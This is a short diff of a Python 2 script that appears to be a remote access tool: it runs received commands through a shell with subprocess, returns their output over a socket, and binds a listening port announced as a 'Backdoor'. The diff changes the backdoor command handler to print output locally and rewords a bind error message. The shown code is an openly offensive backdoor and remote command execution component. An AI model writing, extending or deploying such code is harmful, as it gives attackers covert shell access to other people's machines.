@@ -28,9 +28,10 @@ def command():
     s.send(output)
 
 def bd_command():
+    global output
     cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     output = cmd.stdout.read() + cmd.stderr.read()
-    bds.send(output)
+    print output
 
 # Upload File
 def send_file():
@@ -72,7 +73,7 @@ def backdoor():
     try:
         bdb = bds.bind((bd_host, bd_port))
     except:
-        print "Cannot open port or Backdoor already active"
+        print "Cannot bind port & host"
         exit()
     bds.listen(1)
     print "Backdoor opened: Listening on port: ", bd_port
